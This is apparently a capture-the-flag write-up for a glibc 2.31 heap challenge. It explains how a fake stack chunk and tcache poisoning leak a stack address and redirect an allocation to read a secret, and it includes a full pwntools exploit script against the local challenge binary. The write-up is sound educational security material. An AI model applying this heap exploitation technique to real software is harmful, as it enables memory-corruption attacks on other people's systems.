Looking at the assembly above, malloc receives [rbp-0x21c] as its argument, which is the integer Size. The return value is stored in rax, and is then stored at [rbp+rax*8-0x210].

At this point, rax contains the value stored at [rbp-0x220], which is the index of the allocations array. This forms exactly:

base + index * 8

where 8 represents the size of each element in the allocations array.

Therefore, [rbp-0x210] stores allocations[0].

Exploitation Idea

Since we can write data onto the stack and can also free memory located on the stack, we can construct a fake chunk on the stack and then free it.

This allows us to leak a stack address. How exactly can we do this?

First, let's look at the structure of a chunk in a tcache bin:

             chunk metadata        tcache_entry
          ┌──────────────────┬──────────────────┐
          │ prev_size │ size │ next     │ key   │ ...
          └──────────────────┴──────────────────┘
          0x00        0x08   0x10       0x18
                              ↑
                           user_ptr

First, we malloc a memory block with a requested size of 24 bytes. We name this chunk H.

How do we calculate its actual chunk_size?

The key point is that prev_size is meaningful only when the previous chunk is no longer in use. When the previous chunk is in use, glibc can effectively lend the prev_size field of the next chunk to the current chunk as usable space.

              malloc_chunk
                  ↓
        ┌──────────────────┐
+0x00   │ prev_size   8B   │
        ├──────────────────┤
+0x08   │ size=0x21   8B   │  ← 0x20 | PREV_INUSE
        ├──────────────────┤
+0x10   │                  │ ← p
        │ user data  16B   │
        │                  │
        └──────────────────┘ ← chunk_size=0x20
+0x20   │ next.prev_size   │
        │ ← user can still use 8B
        ├──────────────────┤
+0x28   │ next.size        │ ← must not be overwritten
        └──────────────────┘

        <------ 24B ------->
        p+0x00      ~ p+0x17

Therefore, the actual size of this chunk is 0x20, or 32 bytes, which is exactly 16-byte aligned.

At this point, we know that the chunk we need to construct on the stack should have a size of 0x20 bytes. After setting the PREV_INUSE bit to 1, its size field becomes 0x21.

From Key Memory Locations, we can see that the address passed to stack_free differs from the starting address used by stack_scanf by 0x40.

Therefore, by writing

b"A" * 0x38 + p64(0x21)

using stack_scanf, we construct a fake chunk with a size of 0x20.

We name this chunk S.

At this point, we have two chunks that can be freed: the heap chunk H obtained from malloc(24), and the fake stack chunk S.

We then name the address of allocations[0] as A.

Next, we use the following attack chain to obtain the flag.

Attack Chain

After free(S):           S
After free(H):           H -> S
puts(H):                 leak the stack address of S

Overwrite H.next with A: H -> A
malloc twice:            first obtain H, then obtain A

A is the address of allocations[0]
scanf(allocations[2], p64(secret_addr))
                     ↓
allocations[0] = secret_addr

puts(0):                 read the original secret
send_flag(secret):       obtain the flag

Exploit Script

from pwn import *

context.arch = 'amd64'

PROMPT = b"[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): "

secret_delta = 0xe2 # Different binary files may use different values.

def solve():
    p = process("/challenge/stack-summoning-easy")

    def choose(command):
        p.sendlineafter(PROMPT, command)
    
    def malloc(index, size):
        choose(b"malloc")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.sendlineafter(b"Size: ", str(size).encode())
    
    def free(index):
        choose(b"free")
        p.sendlineafter(b"Index: ", str(index).encode())
    
    def scanf(index, data):
        choose(b"scanf")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.sendline(data)
    
    def stack_scanf(data):
        choose(b"stack_scanf")
        p.sendline(data)
    
    def leak_with_puts(index):
        choose(b"puts")
        p.sendlineafter(b"Index: ", str(index).encode())
        p.recvuntil(b"Data: ")
        return p.recvline(drop=True)

    malloc(0, 24)

    stack_scanf(b"A"*0x38 + p64(0x21))

    choose(b"stack_free")

    free(0)

    raw_leak = leak_with_puts(0)

    if len(raw_leak) != 6:
        p.close()
        return None
    
    stack_chunk = u64(raw_leak + b"\x00\x00")
    array_base = stack_chunk - (0x210 - 0x190 + 0x40)
    secret_addr = stack_chunk - 0x40 + secret_delta

    scanf(0, p64(array_base))

    malloc(1, 24) # obtain H
    malloc(2, 24) # obtain A

    scanf(2, p64(secret_addr))
    secret = leak_with_puts(0)

    log.info(f"secret = {secret}")

    choose(b"send_flag")

    p.sendlineafter(b"Secret: ", secret)
    
    p.interactive()

solve()

One more thing

We can see that the assembly code assigns a value to [rbp-0x210-0x8] at the beginning:

00401d93  48c785e8fdfffff2…  mov     qword [rbp-0x218 {var_220}], 0x2f2

The reason is that before calling scanf, the program first calls malloc_usable_size() to determine the size of the chunk.

00402224  488b84c5f0fdffff   mov     rax, qword [rbp+rax*8-0x210 {var_218}]
0040222c  4889c7             mov     rdi, rax
0040222f  b800000000         mov     eax, 0x0
00402234  e857f0ffff         call    malloc_usable_size

When we write to allocation[0], scanf assumes that we are writing into some chunk, so it checks allocation - 8, which corresponds to the chunk's size field.

The relevant glibc 2.31 source code for this challenge can be found in malloc/malloc.c.

The core implementation is:

static size_t
musable (void *mem)
{
  mchunkptr p;

  if (mem != 0)
    {
      p = mem2chunk(mem);

      if (chunk_is_mmapped(p))
        {
          if (DUMPED_MAIN_ARENA_CHUNK(p))
            return chunksize(p) - SIZE_SZ;
          else
            return chunksize(p) - 2 * SIZE_SZ;
        }
      else if (inuse(p))
        return chunksize(p) - SIZE_SZ;
    }

  return 0;
}

size_t
__malloc_usable_size(void *m)
{
  return musable(m);
}

The related macros are also important:

#define chunk2mem(p)   ((void *)((char *)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char *)(mem) - 2*SIZE_SZ))

#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
#define chunksize(p) (p->mchunk_size & ~SIZE_BITS)

On x86-64, SIZE_SZ == 8. Therefore:

mem = array_base
p   = mem2chunk(mem) = array_base - 0x10
p->mchunk_size       = value of the field at array_base - 0x08

The challenge places the following value there:

0x2f2 = 0x2f0 | 0x2

Therefore:

chunksize(p)
= 0x2f2 & ~0x7
= 0x2f0

Here, the 0x2 bit is IS_MMAPPED.

It causes the code to enter the chunk_is_mmapped(p) branch and return:

0x2f0 - 2 * 8
= 0x2e0

That is:

malloc_usable_size(array_base) == 0x2e0

This is exactly why the challenge uses 0x2f2 rather than simply placing an arbitrary large number there: it both forges a large chunk size and sets IS_MMAPPED, avoiding the inuse(p) branch, which would otherwise inspect metadata associated with the fake chunk's next chunk.
